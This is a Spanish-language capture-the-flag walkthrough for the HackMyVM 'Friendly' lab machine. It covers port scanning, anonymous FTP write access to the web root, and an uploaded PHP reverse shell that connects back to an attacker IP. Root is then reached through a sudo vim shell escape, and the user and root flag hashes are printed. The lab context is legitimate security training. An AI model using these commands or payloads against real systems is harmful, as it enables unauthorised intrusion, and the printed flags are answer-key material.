---
icon: flag
---

# Friendly  HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-13 03:24 EDT
Nmap scan report for 192.168.5.16
Host is up (0.0011s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.54 (Debian)
MAC Address: 08:00:27:A2:9F:C0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.48 seconds
```

Veremos que hay un puerto `FTP` y un puerto `80` solamente, si entramos en el puerto `80` no veremos gran cosa ya que veremos una pagina web por defecto de `apache2`, vamos a probar a conectarnos por `FTP` de forma anonima.

```shell
ftp anonymous@<IP>
```

Dejamos la contraseña vacia y veremos que estaremos dentro, si listamos el servidor veremos lo siguiente:

```
229 Entering Extended Passive Mode (|||46275|)
150 Opening ASCII mode data connection for file list
drwxrwxrwx   2 root     root         4096 Mar 11  2023 .
drwxrwxrwx   2 root     root         4096 Mar 11  2023 ..
-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
226 Transfer complete
```

Vemos algo interesante, vamos a probar a subir un archivo al `FTP` en esta parte ya que parece que el servidor esta compartiendo los archivos `web` y esto puede ser una vulnerabilidad enorme.

> test.txt

```
Texto de prueba
```

Ahora lo subiremos al servidor `FTP` de esta forma:

```shell
put test.txt
```

Una vez subido, vamos desde la `web` a dicho archivo a ver si esta funcionando.

```
URL = http://<IP>/test.txt
```

Info:

```
Texto de prueba
```

Veremos que si esta funcionando de forma correcta, por lo que vamos a probar a subir un archivo en `PHP` para generarnos una `reverse shell` a ver si interpreta `PHP` de forma correcta.

> webshell.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Ahora lo subiremos de la misma forma que estabamos haciendo antes.

```shell
put webshell.php
```

Info:

```
local: webshell.php remote: webshell.php
229 Entering Extended Passive Mode (|||21741|)
150 Opening BINARY mode data connection for webshell.php
100% |****************************************************************************************************************|   112        1.00 MiB/s    00:00 ETA
226 Transfer complete
112 bytes sent in 00:00 (32.90 KiB/s)
```

Una vez que lo hayamos subido, antes de meternos, vamos a ponernos a la escucha de la siguiente forma:

```shell
nc -lvnp <PORT>
```

Ahora si nos vamos al siguiente archivo `web`.

```
URL = http://<IP>/webshell.php
```

Y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.4] from (UNKNOWN) [192.168.5.16] 47722
whoami
www-data
```

Vemos que ha funcionado, por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Ahora podremos leer la `flag` del usuario bien.

> user.txt

```
b8cff8c9008e1c98a1f2937b4475acd6
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for www-data on friendly:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on friendly:
    (ALL : ALL) NOPASSWD: /usr/bin/vim
```

Vemos que podemos ejecutar el binario `vim` como el usuario `root` por lo que haremos lo siguiente:

```shell
sudo vim -c ':!/bin/bash'
```

Info:

```
root@friendly:/home/RiJaba1# whoami
root
```

Con esto ya seremos `root` por lo que leeremos la `flag` del `root`.

```shell
find / -name "root.txt" 2>/dev/null
```

Info:

```
/var/log/apache2/root.txt
```

> root.txt

```
66b5c58f3e83aff307441714d3e28d2f
```
